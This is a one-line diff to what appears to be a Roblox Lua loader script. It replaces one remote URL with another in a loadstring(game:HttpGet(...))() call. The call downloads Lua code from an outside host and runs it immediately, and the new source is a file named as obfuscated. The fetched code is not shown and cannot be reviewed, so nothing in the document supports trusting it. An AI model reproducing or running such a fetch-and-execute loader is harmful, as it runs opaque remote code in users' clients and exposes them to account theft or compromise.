@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/oRh7yzFCmU/0"))()
+loadstring(game:HttpGet("https://codeberg.org/dstr-dev/Loader/raw/branch/main/shittyheads/obfuscated.lua%20%2811%29.txt"))()
